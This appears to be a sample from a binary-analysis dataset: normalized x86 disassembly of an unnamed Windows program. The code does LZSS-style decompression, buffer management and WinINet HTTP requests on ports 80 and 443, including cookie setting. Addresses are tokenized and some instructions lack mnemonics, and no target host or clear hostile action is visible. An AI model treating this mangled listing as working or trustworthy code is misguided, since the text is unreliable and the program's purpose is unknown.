mov [ esi ] edi
call sub_405e50
mov ecx [ esi ]
shl eax 0x18
or ecx eax
mov [ esi ] ecx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
mov ecx esi
call sub_4054e0
lea edi [ esi + 0x8 ]
mov ecx 0x3f1
mov eax 0x20202020
mov [ esp + 0x10 ] ebx
[ edi ]
mov eax [ esi ]
mov edi 0xfc4
cmp eax ebx
jbe r-xdata
mov ecx esi
call sub_4058c0
mov ebx eax
cmp bx 0x100
jge r-xdata
mov ecx esi
call sub_405910
mov dx ax
mov eax edi
sub eax edx
lea ecx [ ebx - 0xfd ]
dec eax
xor ebp ebp
and eax 0xfff
mov [ esp + 0x18 ] ecx
test cx cx
jle r-xdata
movsx eax bx
push eax
mov ecx esi
call sub_405e80
cmp eax 0xffffffff
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esi ]
cmp edx eax
jb r-xdata
movsx eax ax
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x10 ]
movsx ecx di
inc edi
and edi 0xfff
inc eax
mov [ ecx + esi + 0x8 ] bl
mov [ esp + 0x10 ] eax
jmp r-xdata
mov edx [ esp + 0x10 ]
movsx ecx di
inc edi
and edi 0xfff
inc edx
inc ebp
mov [ ecx + esi + 0x8 ] bl
cmp bp [ esp + 0x18 ]
mov [ esp + 0x10 ] edx
jl r-xdata
mov ecx [ esp + 0x14 ]
lea edx [ ecx + ebp ]
mov ecx esi
and edx 0xfff
movzx bx [ edx + esi + 0x8 ]
movsx eax bx
push eax
call sub_405e80
cmp eax 0xffffffff
je r-xdata
sub_405cb0
mov eax [ esp + 0x8 ]
push ebx
mov edx ecx
push esi
push edi
mov edi [ edx + 0x8398 ]
mov ecx [ edx + 0x838c ]
lea esi [ edi + eax ]
cmp esi ecx
jle r-xdata
mov esi [ edx + 0x8384 ]
mov ecx eax
mov ebx ecx
add esi edi
mov edi [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ edx + 0x8398 ]
pop edi
add ecx eax
pop esi
mov [ edx + 0x8398 ] ecx
pop ebx
retn 0x8
sub ecx edi
mov eax ecx
sub_405d00
push ecx
push ebx
mov ebx ecx
push ebp
push esi
mov eax [ ebx + 0x8388 ]
mov esi [ esp + 0x18 ]
push edi
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebx + 0x839c ]
mov ecx [ ebx + 0x8390 ]
add eax esi
cmp eax ecx
jle r-xdata
lea eax [ esi + esi * 2 ]
cdq
sub eax edx
sar eax 0x1
add eax 0x400
push eax
mov [ ebx + 0x8390 ] eax
call sub_4083df
mov ecx [ ebx + 0x8388 ]
add esp 0x4
mov [ ecx ] eax
mov edx [ ebx + 0x8388 ]
mov edi [ edx ]
test edi edi
jne r-xdata
mov edx [ ebx + 0x8388 ]
mov eax [ ebx + 0x839c ]
mov ecx esi
mov esi [ esp + 0x18 ]
mov edi [ edx ]
add edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x1c ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x839c ]
mov edx [ ebx + 0x8394 ]
add ecx eax
pop edi
pop esi
mov [ ebx + 0x839c ] ecx
pop ebp
mov [ edx ] ecx
pop ebx
pop ecx
retn 0x8
lea eax [ eax + eax * 2 ]
cdq
sub eax edx
mov ebp eax
sar ebp 0x1
add ebp 0x400
push ebp
call sub_4083df
mov edx eax
add esp 0x4
test edx edx
mov [ esp + 0x10 ] edx
jne r-xdata
mov ecx [ ebx + 0x8390 ]
xor eax eax
mov edx ecx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn 0x8
mov ecx ebp
xor eax eax
mov esi ecx
mov edi edx
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
[ edi ]
mov ecx [ ebx + 0x839c ]
mov eax [ ebx + 0x8388 ]
mov edi edx
mov edx ecx
mov esi [ eax ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebx + 0x8388 ]
mov ecx [ eax ]
push ecx
call sub_4083b0
mov edx [ ebx + 0x8388 ]
mov eax [ esp + 0x14 ]
mov esi [ esp + 0x20 ]
add esp 0x4
mov [ edx ] eax
mov [ ebx + 0x8390 ] ebp
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn 0x8
sub_405e50
push ecx
lea eax [ esp ]
push 0x1
push eax
mov [ esp + 0x8 ] 0x0
call sub_405cb0
cmp eax 0x1
je r-xdata
mov eax [ esp ]
pop ecx
retn
or eax 0xffffffff
pop ecx
retn
sub_405ea0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ ecx + 0x8384 ] eax
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0x10 ]
mov [ ecx + 0x8394 ] eax
xor eax eax
mov [ ecx + 0x838c ] edx
mov [ ecx + 0x8388 ] esi
mov [ ecx + 0x8398 ] eax
mov [ ecx + 0x839c ] eax
mov [ esi ] eax
mov esi [ ecx + 0x8394 ]
mov [ esi ] eax
mov [ ecx + 0x8376 ] ax
mov [ ecx + 0x8378 ] al
mov [ ecx + 0x837a ] ax
mov [ ecx + 0x837c ] al
mov [ ecx ] edx
call sub_405970
xor eax eax
pop esi
retn 0x10
sub_405f10
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ ecx + 0x8384 ] eax
mov eax [ esp + 0x10 ]
mov [ ecx + 0x838c ] edx
mov edx [ esp + 0xc ]
mov [ ecx + 0x8394 ] eax
xor eax eax
mov [ ecx + 0x8388 ] edx
mov [ ecx + 0x8398 ] eax
mov [ ecx + 0x839c ] eax
mov [ edx ] eax
mov edx [ ecx + 0x8394 ]
mov [ edx ] eax
mov [ ecx + 0x8376 ] ax
mov [ ecx + 0x8378 ] al
mov [ ecx + 0x837a ] ax
mov [ ecx + 0x837c ] al
call sub_405b70
xor eax eax
retn 0x10
sub_405fa0
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
xor ecx ecx
cmp eax ecx
mov [ esi ] ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
jbe r-xdata
mov eax [ esi ]
push eax
call sub_4083df
add esp 0x4
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
retn 0x4
mov edx [ esi ]
add edx 0x3e8
mov ecx edx
mov [ esi ] edx
cmp ecx eax
jb r-xdata
sub_405ff0
push ecx
mov eax [ esp + 0xc ]
push ebx
mov ebx ecx
push ebp
push esi
push edi
mov ecx [ ebx + 0x4 ]
mov ebp [ ebx ]
add ecx eax
cmp ecx ebp
jbe r-xdata
mov edi [ ebx + 0x8 ]
mov edx [ ebx + 0x4 ]
mov esi [ esp + 0x18 ]
mov ecx eax
add edi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x4 ]
pop edi
add ecx eax
pop esi
mov [ ebx + 0x4 ] ecx
pop ebp
pop ebx
pop ecx
retn 0x8
sub ecx ebp
mov eax 0x10624dd3
add ecx 0x3e7
mul ecx
shr edx 0x6
lea eax [ edx + edx * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
lea ebp [ ebp + edx * 8 ]
push ebp
call sub_4083df
mov ecx [ ebx ]
mov esi [ ebx + 0x8 ]
mov [ esp + 0x14 ] eax
mov edi eax
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x8 ]
push ecx
call sub_4083b0
mov edx [ esp + 0x18 ]
mov eax [ esp + 0x24 ]
add esp 0x8
mov [ ebx + 0x8 ] edx
mov [ ebx ] ebp
sub_4060a0
mov eax 0x140c
call sub_408e30
mov dx [ rw-data ]
push ebx
push ebp
push esi
mov ebp ecx
push edi
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x1e ]
mov [ esp + 0x1c ] dx
[ edi ]
stosw [ edi ]
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x81e ]
mov [ esp + 0x81c ] dx
[ edi ]
stosw [ edi ]
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x41e ]
mov [ esp + 0x41c ] dx
[ edi ]
stosw [ edi ]
mov ecx 0xff
xor eax eax
lea edi [ esp + 0x101e ]
mov [ esp + 0x101c ] dx
[ edi ]
stosw [ edi ]
mov ecx 0xff
xor eax eax
lea edi [ esp + 0xc1e ]
mov [ esp + 0xc1c ] dx
[ edi ]
stosw [ edi ]
lea eax [ esp + 0xc1c ]
lea ecx [ esp + 0x14 ]
push eax
lea edx [ esp + 0x1020 ]
push ecx
lea eax [ esp + 0x424 ]
push edx
lea ecx [ esp + 0x828 ]
push eax
mov eax [ esp + 0x1430 ]
lea edx [ esp + 0x2c ]
push ecx
xor esi esi
push edx
push eax
mov [ esp + 0x34 ] ebp
mov [ esp + 0x30 ] esi
call sub_407e60
push 0x5
lea ecx [ esp + 0x3c ]
push rw-data
push ecx
call sub_4092e0
add esp 0x28
test eax eax
jne r-xdata
push 0x4
lea edx [ esp + 0x20 ]
push rw-data
push edx
call sub_4092e0
add esp 0xc
test eax eax
jne r-xdata
mov [ esp + 0x10 ] 0x2
jmp r-xdata
push 0x3
lea eax [ esp + 0x20 ]
push rw-data
push eax
call sub_4092e0
add esp 0xc
test eax eax
jne r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
lea edi [ esp + 0xc1c ]
or ecx 0xffffffff
xor eax eax
add ebp 0x40
[ edi ]
not ecx
dec ecx
mov ebx ecx
cmp ebx 0xfffffffd
jbe r-xdata
mov [ esp + 0x10 ] esi
mov ecx [ ebp + 0x4 ]
cmp ecx esi
je r-xdata
call sub_40fc40
cmp ebx esi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebp
call sub_404100
jmp r-xdata
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebp
call sub_404100
cmp eax ebx
jae r-xdata
mov edx [ esp + 0x1428 ]
cmp edx esi
jne r-xdata
cmp ebx esi
jne r-xdata
mov ebx [ esp + 0x1424 ]
cmp ebx esi
jne r-xdata
lea edi [ esp + 0x41c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
je r-xdata
mov edi [ ebp + 0x4 ]
mov ecx ebx
mov edx ecx
lea esi [ esp + 0xc1c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x4 ]
mov [ ebp + 0x8 ] ebx
xor esi esi
mov [ ebx + eax ] 0x0
push ebx
mov ecx ebp
call sub_4042f0
dec al
mov [ ecx - 0x1 ] al
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] esi
jmp r-xdata
mov eax ebx
lea edi [ esp + 0x81c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x81c ]
jne r-xdata
lea edx [ esp + 0x41c ]
mov edi [ esp + 0x142c ]
mov ecx [ esp + 0x18 ]
push edi
mov edi [ esp + 0x14 ]
mov esi [ ecx ]
push edi
push edx
mov edx [ esp + 0x20 ]
push eax
lea eax [ esp + 0x102c ]
push edx
push eax
call [ esi + 0x4 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x140c
retn 0x10
sub_4062f0
push ebp
mov ebp esp
push 0xffffffff
push sub_410620
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
mov eax [ ebp + 0x1c ]
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x0
push 0x0
push 0x0
mov esi ecx
push 0x0
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x11 ] 0x1
mov [ ebp - 0x4 ] 0x0
call [ InternetOpenA@IAT ]
test eax eax
mov [ esi + 0x4 ] eax
je r-xdata
lea ecx [ ebp - 0x24 ]
push r--data
push ecx
mov [ ebp - 0x24 ] rw-data
call sub_409349
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x11 ] 0x0
mov eax [ esi + 0x4 ]
push eax
call [ InternetCloseHandle@IAT ]
mov esi [ esi + 0x8 ]
push esi
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push eax
push ecx
push edx
call sub_406090
add esp 0x10
mov eax r-xdata
retn
cmp eax 0xffffffff
je r-xdata
mov ecx [ ebp + 0x18 ]
sub ecx 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
dec ecx
je r-xdata
push 0x0
push 0x8000000
push 0x1
mov ecx 0x15
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
dec ecx
jne r-xdata
lea eax [ ebp - 0x20 ]
push r--data
push eax
mov [ ebp - 0x20 ] rw-data
call sub_409349
cmp eax 0xffffffff
je r-xdata
push 0x0
push 0x0
push 0x3
jmp r-xdata
mov ecx 0x50
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
jne r-xdata
push 0x0
call [ InternetAttemptConnect@IAT ]
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
push eax
call [ InternetConnectA@IAT ]
mov [ esi + 0x8 ] eax
push 0x0
push 0x0
push 0x3
jmp r-xdata
mov ecx 0x1bb
mov edi [ ebp + 0x8 ]
or ecx 0xffffffff
xor eax eax
lea ebx [ esi + 0x10 ]
[ edi ]
not ecx
dec ecx
mov edi ecx
mov ecx ebx
mov [ ebp + 0x1c ] edi
call sub_4042e0
cmp eax edi
jae r-xdata
lea edx [ ebp - 0x1c ]
push r--data
push edx
mov [ ebp - 0x1c ] rw-data
call sub_409349
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
call sub_40fc40
test edi edi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebx
call sub_404100
jmp r-xdata
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebx
call sub_404100
cmp eax edi
jae r-xdata
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
test edi edi
jne r-xdata
mov [ esi + 0x50 ] eax
mov eax [ ebp + 0x18 ]
sub eax 0x0
je r-xdata
mov eax [ ebp + 0x1c ]
mov edi [ ebx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov ecx eax
mov edx ecx
push eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx ebx
call sub_404150
mov esi [ ebp - 0x18 ]
push edi
mov ecx ebx
call sub_4042f0
dec al
push edi
mov [ ecx - 0x1 ] al
mov ecx ebx
call sub_404100
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
mov edi eax
xor eax eax
lea ebx [ ecx + 0x20 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov esi ecx
mov ecx ebx
mov [ ebp + 0x1c ] esi
call sub_4042e0
cmp eax esi
jae r-xdata
mov [ esi + 0x50 ] 0x15
jmp r-xdata
dec eax
je r-xdata
mov ecx esi
call sub_406bf0
mov ecx esi
call sub_406b80
mov ecx [ ebp - 0xc ]
mov al [ ebp - 0x11 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x18
mov eax [ ebp - 0x18 ]
mov edi [ ebp + 0x14 ]
or ecx 0xffffffff
lea ebx [ eax + 0x30 ]
xor eax eax
[ edi ]
not ecx
dec ecx
mov esi ecx
mov ecx ebx
mov [ ebp + 0x10 ] esi
call sub_4042e0
cmp eax esi
jae r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
call sub_40fc40
mov eax [ ebp + 0x18 ]
mov [ esi + 0x54 ] eax
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov [ esi + 0x50 ] 0x50
jmp r-xdata
dec eax
jne r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
call sub_40fc40
test esi esi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov [ esi + 0x50 ] 0x1bb
jmp r-xdata
test esi esi
jne r-xdata
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebx
call sub_404100
jmp r-xdata
cmp al 0xff
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x1f
ja r-xdata
push 0x1
mov ecx ebx
call sub_404100
jmp r-xdata
cmp al 0xff
je r-xdata
push 0x1
mov ecx ebx
call sub_404100
cmp eax esi
jae r-xdata
mov esi [ ebp - 0x18 ]
test esi esi
jne r-xdata
push 0x1
mov ecx ebx
call sub_404100
cmp eax esi
jae r-xdata
mov esi [ ebp - 0x18 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x1c ]
mov edi [ ebx + 0x4 ]
mov esi [ ebp + 0x10 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov [ ebx + 0x8 ] eax
mov ebx [ ebx + 0x4 ]
add ebx eax
mov [ ebx ] 0x0
push esi
mov ecx ebx
call sub_4042f0
dec al
push esi
mov [ ecx - 0x1 ] al
mov ecx ebx
call sub_404100
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ ebx + 0x4 ]
mov esi [ ebp + 0x14 ]
mov ecx eax
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov [ ebx + 0x8 ] eax
mov ebx [ ebx + 0x4 ]
add ebx eax
mov [ ebx ] 0x0
push esi
mov ecx ebx
call sub_4042f0
dec al
push esi
mov [ ecx - 0x1 ] al
mov ecx ebx
call sub_404100
jmp r-xdata
sub_40668d
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x11 ] 0x0
mov eax [ esi + 0x4 ]
push eax
call [ InternetCloseHandle@IAT ]
mov esi [ esi + 0x8 ]
push esi
call [ CloseHandle@IAT ]
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push rw-data
push eax
push ecx
push edx
call sub_406090
add esp 0x10
mov eax r-xdata
retn
sub_4066d0
push esi
mov esi ecx
push edi
mov edi [ InternetCloseHandle@IAT ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov esi [ esi + 0x4 ]
test esi esi
je r-xdata
push eax
call edi
pop edi
pop esi
retn
push esi
call edi
sub_406700
push ebp
mov ebp esp
push 0xffffffff
push sub_410630
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
xor ebx ebx
mov edi ecx
sub eax ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x4 ] ebx
je r-xdata
mov eax [ ebp + 0x18 ]
mov esi [ ebp + 0x8 ]
mov edx [ edi ]
push eax
push esi
mov ecx edi
call [ edx + 0x14 ]
dec eax
je r-xdata
mov edx [ edi + 0xc ]
push edx
call [ InternetCloseHandle@IAT ]
mov [ edi + 0xc ] ebx
jmp r-xdata
lea ebx [ edi + 0x40 ]
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push 0x1
mov edi ecx
mov ecx ebx
push edi
mov [ ebp + 0x18 ] edi
call sub_404170
test al al
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
mov edx [ edi ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
push eax
push esi
mov ecx edi
call [ edx + 0x10 ]
jmp r-xdata
dec eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov al [ ebp - 0x11 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov ecx edi
mov edi [ ebx + 0x4 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
mov eax edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov [ ecx + eax ] 0x0
test al al
mov [ ebp - 0x11 ] al
je r-xdata
mov ecx [ ebp + 0x18 ]
mov esi [ ebp + 0x8 ]
mov eax [ edi ]
push ecx
push esi
mov ecx edi
call [ eax + 0x8 ]
jmp r-xdata
sub_4067e6
mov esi [ ebp - 0x18 ]
mov eax [ esi + 0xc ]
push eax
call [ InternetCloseHandle@IAT ]
mov [ esi + 0xc ] 0x0
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
push ecx
mov ecx [ esi + 0x54 ]
push edx
mov edx [ esi + 0x50 ]
push ecx
push edx
push eax
call sub_406090
add esp 0x14
mov eax r-xdata
retn
mov eax r--data
sub_406825
mov esi [ ebp - 0x18 ]
mov eax [ esi + 0xc ]
push eax
call [ InternetCloseHandle@IAT ]
mov [ esi + 0xc ] 0x0
mov eax [ esi + 0x14 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ esi + 0x54 ]
push rw-data
push ecx
mov ecx [ esi + 0x50 ]
push edx
push ecx
push eax
call sub_406090
add esp 0x14
mov eax r-xdata
retn
mov eax r--data
sub_406870
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_410648
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebp
mov ebp ecx
push esi
push edi
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea ecx [ esp + 0x38 ]
push r--data
push ecx
mov [ esp + 0x40 ] rw-data
call sub_409349
nop
nop
nop
nop
cmp eax 0xffffffff
je r-xdata
mov edx [ ebp + 0x54 ]
xor ecx ecx
cmp edx 0x2
mov edx [ esp + 0x3c ]
setne cl
dec ecx
push 0x0
and ecx 0x800000
or ecx 0x4000000
push ecx
mov ecx [ esp + 0x40 ]
push rw-data
push edx
push rw-data
push ecx
push rw-data
push eax
call [ HttpOpenRequestA@IAT ]
mov edx eax
test edx edx
mov [ ebp + 0xc ] edx
je r-xdata
lea eax [ esp + 0x38 ]
push r--data
push eax
mov [ esp + 0x40 ] rw-data
call sub_409349
cmp edx 0xffffffff
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x80000000
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push edx
call [ HttpAddRequestHeadersA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x6c ]
test eax eax
jbe r-xdata
lea edx [ esp + 0x38 ]
push r--data
push edx
mov [ esp + 0x40 ] rw-data
call sub_409349
mov ecx [ ebp + 0xc ]
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
call [ HttpSendRequestA@IAT ]
test eax eax
jne r-xdata
mov al [ esp + 0x38 ]
push ebx
push 0x0
lea ecx [ esp + 0x20 ]
mov [ esp + 0x20 ] al
call sub_404100
mov eax [ ebp + 0x54 ]
mov [ esp + 0x34 ] 0x0
dec eax
je r-xdata
mov ecx [ esp + 0x28 ]
pop edi
pop esi
mov al 0x1
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x28
retn 0x8
lea edx [ esp + 0x3c ]
push r--data
push edx
mov [ esp + 0x44 ] rw-data
call sub_409349
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebx ecx
lea ecx [ esp + 0x20 ]
push ebx
call sub_404170
test al al
je r-xdata
dec eax
jne r-xdata
mov edx [ ebp + 0x14 ]
pop ebx
test edx edx
jne r-xdata
mov edi [ esp + 0x20 ]
mov ecx ebx
mov eax ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov edi rw-data
or ecx 0xffffffff
xor eax eax
push 0x1
[ edi ]
not ecx
dec ecx
mov ebx ecx
lea ecx [ esp + 0x20 ]
push ebx
call sub_404170
test al al
je r-xdata
mov edi edx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
lea ecx [ esp + 0x20 ]
call sub_408220
mov eax [ ebp + 0x54 ]
cmp eax 0x1
jne r-xdata
mov edx r--data
mov edi [ esp + 0x20 ]
mov ecx ebx
mov edx ecx
mov esi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
jmp r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp + 0x50 ] 0x50
je r-xdata
and ecx 0x3
push ebx
[ edi ] [ esi ]
lea ecx [ esp + 0x20 ]
call sub_404150
mov cx [ rw-data ]
mov eax [ ebp + 0x50 ]
mov [ esp + 0xc ] cx
xor edx edx
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0x12 ] edx
push rw-data
push ecx
mov [ esp + 0x1e ] edx
call sub_409383
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0xc ]
push ecx
push edx
lea ecx [ esp + 0x20 ]
call sub_408220
cmp [ ebp + 0x50 ] 0x1bb
je r-xdata
mov edx [ esp + 0x38 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
lea ecx [ esp + 0x20 ]
call sub_408220
mov eax [ ebp + 0x68 ]
mov esi [ eax ]
cmp esi eax
je r-xdata
mov ecx [ esp + 0x1c ]
mov [ esp + 0x30 ] 0xffffffff
test ecx ecx
je r-xdata
mov edi [ InternetSetCookieA@IAT ]
mov al [ ecx - 0x1 ]
test al al
je r-xdata
mov ecx [ ecx + 0x4 ]
mov edx r--data
test ecx ecx
je r-xdata
mov eax r--data
dec ecx
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
mov ecx [ esp + 0x1c ]
test ecx ecx
jne r-xdata
mov edx ecx
dec al
mov [ ecx - 0x1 ] al
jmp r-xdata
push eax
push edx
push ecx
call edi
test eax eax
je r-xdata
mov ecx r--data
lea eax [ esp + 0x38 ]
push r--data
push eax
mov [ esp + 0x40 ] rw-data
call sub_409349
mov esi [ esi ]
mov eax [ ebp + 0x68 ]
cmp esi eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x14 ]
test eax eax
jne r-xdata
sub_406b80
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x60 ]
test eax eax
jbe r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x5c ]
mov esi [ eax ]
cmp esi eax
je r-xdata
mov ebx [ edi + 0x5c ]
mov esi [ ebx ]
cmp esi ebx
je r-xdata
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov eax esi
mov esi [ esi ]
push eax
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
call sub_408e5f
mov ecx [ edi + 0x60 ]
add esp 0x4
dec ecx
cmp esi ebx
mov [ edi + 0x60 ] ecx
jne r-xdata
mov esi [ esi ]
mov eax [ edi + 0x5c ]
cmp esi eax
jne r-xdata
mov ecx ebx
call sub_406c60
push ebx
call sub_408e5f
add esp 0x4
sub_406bf0
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x6c ]
test eax eax
jbe r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x68 ]
mov esi [ eax ]
cmp esi eax
je r-xdata
mov ebx [ edi + 0x68 ]
mov esi [ ebx ]
cmp esi ebx
je r-xdata
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov eax esi
mov esi [ esi ]
push eax
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
call sub_408e5f
mov ecx [ edi + 0x6c ]
add esp 0x4
dec ecx
cmp esi ebx
mov [ edi + 0x6c ] ecx
jne r-xdata
mov esi [ esi ]
mov eax [ edi + 0x68 ]
cmp esi eax
jne r-xdata
mov ecx ebx
call sub_406c60
push ebx
call sub_408e5f
add esp 0x4
sub_406c60
push ebx
push esi
mov esi ecx
xor ebx ebx
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
pop esi
pop ebx
retn
lea ecx [ eax - 0x1 ]
mov al [ eax - 0x1 ]
cmp al bl
je r-xdata
push ecx
call sub_408e5f
add esp 0x4
cmp al 0xff
je r-xdata
